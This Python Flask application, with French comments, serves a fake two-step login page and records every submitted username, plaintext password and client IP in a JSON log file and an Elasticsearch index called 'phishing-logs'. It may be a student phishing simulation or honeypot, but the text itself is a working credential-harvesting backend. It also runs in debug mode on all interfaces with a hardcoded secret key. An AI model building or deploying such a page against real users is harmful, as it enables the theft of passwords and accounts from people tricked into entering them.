from flask import Flask, request, session, redirect, url_for, render_template, abort
from elasticsearch import Elasticsearch
import os
import json
from datetime import datetime, timezone

app = Flask(__name__)
app.secret_key = 'SAE2025'
es = Elasticsearch(['http://localhost:9200'])

LOG_FILE = os.path.join(os.path.dirname(__file__), 'logs', 'phishing_logs.json')
BACKUP_LOG_FILE = os.path.join(os.path.dirname(__file__), 'logs', 'phishing_logs_backup.json')

os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

def initialize_log_file(file_path):
    if not os.path.exists(file_path):
        with open(file_path, 'w') as f:
            json.dump([], f)

initialize_log_file(LOG_FILE)

def read_logs(file_path):
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except json.JSONDecodeError:
        return []
    except Exception as e:
        print(f"Erreur lors de la lecture du fichier {file_path}: {e}")
        return []

def write_logs(file_path, logs):
    try:
        with open(file_path, 'w') as f:
            json.dump(logs, f, indent=4)
    except Exception as e:
        print(f"Erreur lors de l'écriture dans le fichier {file_path}: {e}")

def get_client_ip():
    # Récupère l'adresse IP source de la requête
    if 'X-Forwarded-For' in request.headers:
        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0]
    elif 'X-Real-Ip' in request.headers:
        ip = request.headers.get('X-Real-Ip')
    else:
        ip = request.remote_addr
    return ip

def log_attempt(login, password, ip):
    log_entry = {
        "@timestamp": datetime.now(timezone.utc).isoformat(),
        "login": login,
        "password": password,
        "ip": ip,
        "event": "fake_login_attempt"
    }

    logs = read_logs(LOG_FILE)
    logs.append(log_entry)
    write_logs(LOG_FILE, logs)

    try:
        resp = es.index(index='phishing-logs', document=log_entry)
        print(f"Log enregistré dans Elasticsearch: {resp['_id']}")
    except Exception as e:
        print(f"Erreur lors de l'envoi à Elasticsearch: {e}")
        with open(BACKUP_LOG_FILE, 'a') as f:
            json.dump(log_entry, f)
            f.write('\n')

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        session['login'] = request.form.get('login')
        return redirect(url_for('password'))
    return render_template('login.html')

@app.route('/password', methods=['GET', 'POST'])
def password():
    if request.method == 'POST':
        password = request.form.get('password')
        ip = get_client_ip()
        log_attempt(session.get('login', ''), password, ip)
        session['connected'] = True
        return redirect(url_for('connect'))

    if 'login' not in session:
        return redirect(url_for('login'))

    return render_template('password.html', login=session.get('login', ''))

@app.route('/connect')
def connect():
    if not session.get('connected'):
        return redirect(url_for('login'))

    return render_template('connect.html', login=session.get('login', ''))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002, debug=True)
